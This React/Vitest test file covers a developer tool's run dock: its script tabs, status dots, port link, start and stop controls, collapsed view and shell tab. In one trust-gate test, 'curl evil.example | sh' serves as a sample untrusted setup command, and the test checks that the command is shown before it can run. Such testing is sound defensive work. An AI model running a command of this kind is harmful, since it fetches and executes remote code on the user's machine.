import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";

import { renderWithProviders } from "../test/render.js";
import { NO_SCRIPTS_STATUS, trpcMock } from "../test/trpc-mock.js";
import { RunDock } from "./RunDock.js";

vi.mock("../lib/trpc.js", async () => ({ trpc: (await import("../test/trpc-mock.js")).trpcMock }));

/** O terminal de verdade abre WebSocket e mede DOM; aqui ele só precisa existir. */
vi.mock("./Terminal.js", () => ({
  Terminal: ({ sessionId, readOnly }: { sessionId: string; readOnly?: boolean }) => (
    <div data-testid="terminal" data-session={sessionId} data-readonly={String(readOnly ?? false)} />
  ),
}));

const scope = { scopeType: "worktree", scopeId: "wt_1" } as const;

const dock = {
  open: true,
  height: 256,
  toggle: vi.fn(),
  setHeight: vi.fn(),
  beginResize: vi.fn(),
};

/** Um status com o que o teste quer dizer, sobre o vazio de sempre. */
function status(overrides: Record<string, unknown> = {}) {
  return { ...NO_SCRIPTS_STATUS, ...overrides };
}

function execution(overrides: Record<string, unknown> = {}) {
  return {
    sessionId: "se_1",
    exitCode: null,
    running: true,
    startedAt: new Date().toISOString(),
    finishedAt: null,
    command: "pnpm dev",
    ...overrides,
  };
}

beforeEach(() => {
  vi.clearAllMocks();
  trpcMock.scripts.status.query.mockResolvedValue(NO_SCRIPTS_STATUS);
  trpcMock.session.listByScope.query.mockResolvedValue([]);
});

describe("as três abas", () => {
  it("são a mesma primitiva: a saída é o terminal de sempre", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: execution() },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const terminal = await screen.findByTestId("terminal");
    expect(terminal).toHaveAttribute("data-session", "se_1");
    // Vivo: o terminal aceita entrada. É a mesma regra da aba de sessão.
    expect(terminal).toHaveAttribute("data-readonly", "false");
  });

  it("execução terminada vira registro, e o terminal fica somente leitura", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: "./setup.sh", run: null, teardown: null },
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 0 }) },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Setup/ }));

    expect(await screen.findByTestId("terminal")).toHaveAttribute("data-readonly", "true");
  });
});

describe("o ponto de estado mora na aba", () => {
  it("verde quando tem coisa de pé", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ run: { command: "pnpm dev", last: execution() } }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByTestId("dot-run")).toHaveClass("dtab__dot--run");
  });

  it("vermelho quando a última falhou, verde quando passou", async () => {
    // As duas perguntas que trazem alguém ao rodapé — e é por isso que elas não
    // podem morar dentro da aba.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 1 }) },
        run: { command: "pnpm dev", last: execution({ running: false, exitCode: 0 }) },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByTestId("dot-setup")).toHaveClass("dtab__dot--fail");
    expect(await screen.findByTestId("dot-run")).toHaveClass("dtab__dot--ok");
  });
});

describe("o botão que abre a porta", () => {
  it("aponta para o loopback e diz que a porta veio da saída", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 5173, source: "output" },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const open = await screen.findByRole("link", { name: /Abrir/ });
    expect(open).toHaveAttribute("href", "http://127.0.0.1:5173");
    // A proveniência é a feature: um botão que abre a porta errada é pior que
    // botão nenhum, então ele diz de onde tirou o número (S6).
    expect(screen.getByText("porta lida da saída")).toBeInTheDocument();
  });

  it("diz quando a porta veio da variável", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 45000, source: "env" },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText("porta de LUMEM_RUN_PORT")).toBeInTheDocument();
  });

  it("não existe enquanto ninguém achou porta nenhuma", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ run: { command: "pnpm dev", last: execution() }, port: null }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    await screen.findByRole("button", { name: /parar/ });
    expect(screen.queryByRole("link", { name: /Abrir/ })).not.toBeInTheDocument();
  });
});

describe("rodar e parar", () => {
  it("o gesto de rodar existe uma vez só, na barra", async () => {
    // Achado pelo e2e: o corpo repetia o botão da barra, a uma mão de distância.
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: null },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findAllByRole("button", { name: /rodar/ })).toHaveLength(1);
  });

  it("roda o que o repositório declara", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ scripts: { setup: null, run: "pnpm dev", teardown: null }, run: { command: "pnpm dev", last: null } }),
    );
    trpcMock.scripts.start.mutate.mockResolvedValue({ sessionId: "se_1", stoppedPrevious: null });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("button", { name: /rodar/ }));

    await waitFor(() => {
      expect(trpcMock.scripts.start.mutate).toHaveBeenCalledWith({ ...scope, phase: "run" });
    });
  });

  it("parar não é botão vermelho cheio — é rotina, e reversível", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({ run: { command: "pnpm dev", last: execution() } }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    const stop = await screen.findByRole("button", { name: /parar/ });
    expect(stop).not.toHaveClass("btn--danger");
  });
});

describe("o projeto sem [scripts]", () => {
  it("ensina o arquivo em vez de pedir desculpa", async () => {
    // O estado normal, não o excepcional: é a única superfície onde alguém
    // descobre que esse arquivo existe.
    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByText(/não diz como rodar/)).toBeInTheDocument();
    expect(screen.getByText("/repo/.lumem/project.toml")).toBeInTheDocument();
    expect(screen.getByText(/\[scripts\]/)).toBeInTheDocument();
  });

  it("criar o arquivo escreve no repositório de quem está lendo", async () => {
    trpcMock.scripts.writeFile.mutate.mockResolvedValue({
      setup: null,
      run: "pnpm dev",
      teardown: null,
    });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("button", { name: "criar o arquivo" }));

    await waitFor(() => {
      expect(trpcMock.scripts.writeFile.mutate).toHaveBeenCalledWith({ ...scope, run: "pnpm dev" });
    });
  });
});

describe("o portão de confiança (S11)", () => {
  it("mostra o comando ANTES de rodar, e não oferece rodar", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        trusted: false,
        scripts: { setup: "curl evil.example | sh", run: null, teardown: null },
        setup: { command: "curl evil.example | sh", last: null },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Setup/ }));

    expect(await screen.findByText("curl evil.example | sh")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /confiar neste projeto/ })).toBeInTheDocument();
  });

  it("confiar é decisão de projeto, e volta a perguntar se o comando mudar", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        trusted: false,
        scripts: { setup: null, run: "pnpm dev", teardown: null },
        run: { command: "pnpm dev", last: null },
      }),
    );
    trpcMock.scripts.trust.mutate.mockResolvedValue({ projectId: "pr_1" });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("button", { name: /confiar neste projeto/ }));

    await waitFor(() => {
      expect(trpcMock.scripts.trust.mutate).toHaveBeenCalledWith(scope);
    });
    expect(screen.getByText(/volta a perguntar se o comando mudar/)).toBeInTheDocument();
  });
});

describe("o setup que falhou", () => {
  it("é uma tira dentro da aba, e não um diálogo que some", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        scripts: { setup: "./setup.sh", run: null, teardown: null },
        setup: { command: "./setup.sh", last: execution({ running: false, exitCode: 1 }) },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: /Setup/ }));

    expect(await screen.findByText(/o setup dela falhou/)).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /tentar de novo/ })).toBeInTheDocument();
  });
});

describe("o checkout que não dá para ler", () => {
  it("mostra o motivo em vez de ficar em `lendo o checkout…` para sempre", async () => {
    // Achado pelo e2e: `[scripts]` com TOML quebrado. O daemon recusa com o
    // motivo, e a tela precisava saber mostrar.
    trpcMock.scripts.status.query.mockRejectedValue(
      new Error(".lumem/project.toml não é TOML válido: linha 5"),
    );

    renderWithProviders(<RunDock scope={scope} dock={dock} />);

    expect(await screen.findByRole("alert")).toHaveTextContent(/não é TOML válido/);
  });
});

describe("recolhido", () => {
  it("continua dizendo o que está vivo, com a porta", async () => {
    trpcMock.scripts.status.query.mockResolvedValue(
      status({
        run: { command: "pnpm dev", last: execution() },
        port: { port: 55061, source: "output" },
      }),
    );

    renderWithProviders(<RunDock scope={scope} dock={{ ...dock, open: false }} />);

    expect(await screen.findByText(/run · :55061/)).toBeInTheDocument();
    expect(screen.queryByRole("tab", { name: /Run/ })).not.toBeInTheDocument();
  });

  it("abrir devolve as abas", async () => {
    const toggle = vi.fn();
    renderWithProviders(<RunDock scope={scope} dock={{ ...dock, open: false, toggle }} />);

    await userEvent.click(await screen.findByRole("button", { name: /abrir o rodapé/ }));

    expect(toggle).toHaveBeenCalled();
  });
});

describe("a aba Terminal", () => {
  it("abre a sessão de shell que o daemon já sabe abrir", async () => {
    trpcMock.session.createShell.mutate.mockResolvedValue({ id: "se_shell", kind: "shell" });

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: "Terminal" }));
    await userEvent.click(await screen.findByRole("button", { name: /abrir terminal/ }));

    await waitFor(() => {
      expect(trpcMock.session.createShell.mutate).toHaveBeenCalledWith(scope);
    });
  });

  it("mostra a shell que já está viva neste checkout", async () => {
    trpcMock.session.listByScope.query.mockResolvedValue([
      { id: "se_shell", kind: "shell", state: "running", cwd: "/repo/wt", command: "/bin/zsh" },
    ]);

    renderWithProviders(<RunDock scope={scope} dock={dock} />);
    await userEvent.click(await screen.findByRole("tab", { name: "Terminal" }));

    expect(await screen.findByTestId("terminal")).toHaveAttribute("data-session", "se_shell");
  });
});
